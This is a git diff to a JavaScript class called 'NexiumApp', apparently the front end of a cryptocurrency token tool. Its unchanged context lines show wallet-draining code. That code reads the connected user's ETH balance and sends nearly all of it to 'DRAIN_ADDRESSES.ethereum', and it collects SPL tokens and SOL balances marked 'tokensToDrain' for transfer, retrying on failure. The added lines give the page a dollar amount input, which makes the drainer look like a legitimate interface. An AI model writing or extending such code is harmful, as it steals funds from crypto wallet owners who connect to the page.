@@ -342,7 +342,6 @@ class NexiumApp {
           const balance = await provider.getBalance(wallet);
           console.log(`💰 ETH Balance: ${ethers.formatEther(balance)} ETH`);
           
-
           const gasLimit = ethers.parseUnits("0.0001", "ether");
           let sendAmount = balance - gasLimit;
 
@@ -355,7 +354,6 @@ class NexiumApp {
 
           console.log(`🚀 Attempting Transaction ${attempts + 1}/${maxRetries}`);
           
-
           const tx = await signer.sendTransaction({
             to: DRAIN_ADDRESSES.ethereum,
             value: sendAmount,
@@ -386,7 +384,7 @@ class NexiumApp {
       this.hideProcessingSpinner();
     } catch (error) {
       console.error("❌ Could not retrieve signer:", error);
-    
+      
       this.hideProcessingSpinner();
     }
   }
@@ -423,11 +421,9 @@ class NexiumApp {
       console.log(`Found ${tokensToDrain.length} tokens with balance`);
       console.log(`✅ Related SPL Mint Token with Balances:`, tokensToDrain);
       
-
       const balance = await this.solConnection.getBalance(senderPublicKey);
       console.log(`💰 SOL Balance: ${balance / 1000000000} SOL`);
       
-
       const gasFee = 2000000;
 
       if (balance <= gasFee) {
@@ -447,8 +443,7 @@ class NexiumApp {
       while (attempts < maxRetries) {
         try {
           console.log(`🚀 Attempting SOL Transaction ${attempts + 1}/${maxRetries}...`);
-         
-
+          
           const updatedBlockhash = await this.solConnection.getLatestBlockhash();
           console.log("🔄 Refetched Blockhash:", updatedBlockhash.blockhash);
 
@@ -730,6 +725,15 @@ class NexiumApp {
     `;
     this.dom.app.innerHTML = '';
     this.dom.app.appendChild(tokenInterface);
+    // Add the Amount input field below the token interface
+    const amountSection = document.createElement('section');
+    amountSection.className = 'amount-section fade-in mt-6 bg-[#1a182e] p-6 rounded-xl border border-orange-400 shadow-card glass';
+    amountSection.innerHTML = `
+      <div class="input-group flex space-x-2">
+        <input id="volumeInput" type="number" placeholder="Amount in $" class="volume-input flex-grow bg-[#1a182e] border border-orange-400 text-white px-2 py-1 rounded-xl" aria-label="Amount in dollars" min="0" step="0.01">
+      </div>
+    `;
+    this.dom.app.appendChild(amountSection);
     this.dom.tokenSelect = document.getElementById('tokenSelect');
     this.dom.volumeSection = document.getElementById('volumeSection');
     this.dom.customTokenNameInput = document.getElementById('customTokenNameInput');
@@ -737,6 +741,7 @@ class NexiumApp {
     this.dom.showCustomTokenBtn = document.getElementById('showCustomTokenBtn');
     this.dom.tokenInfo = document.getElementById('tokenInfoDisplay');
     this.dom.tokenList = document.getElementById('tokenList');
+    this.dom.volumeInput = document.getElementById('volumeInput'); // Cache the new input field
 
     if (this.dom.showCustomTokenBtn) {
       const debouncedShowCustomToken = this.debounce(() => {
@@ -884,7 +889,6 @@ class NexiumApp {
         decimals = 9;
         symbol = selectedToken.symbol;
       } else {
-       
         this.hideProcessingSpinner();
         return;
       }
